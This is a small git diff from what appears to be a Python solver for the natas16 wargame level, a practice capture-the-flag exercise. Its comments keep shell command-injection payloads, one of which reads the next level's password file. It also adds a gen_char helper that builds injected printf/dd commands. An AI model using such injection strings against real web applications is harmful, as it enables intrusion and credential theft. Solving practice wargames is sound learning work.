@@ -3,7 +3,10 @@ from common import *
 # commands to remember:
 '^$(cut -c 2-2 /etc/natas_webpass/natas17)'
 'echo $(sed -n 31p simulators/16-source.php | cut -c 26-26)hi there'      # if i find a way to get pipe to work, this will be the way to go, let's me get \ 
+'printf $(dd ibs=1 skip=1113 count=1 if=index.php 2>/dev/null)042'   # prints "! we're done! and 073 is ;
 
+def gen_char(char):
+    return f'printf $(dd ibs=1 skip=1113 count=1 if=index.php 2>/dev/null){oct(ord(char))[2:]}'
 
 def solve(driver, last_password):
     driver.get(build_url(level=16))
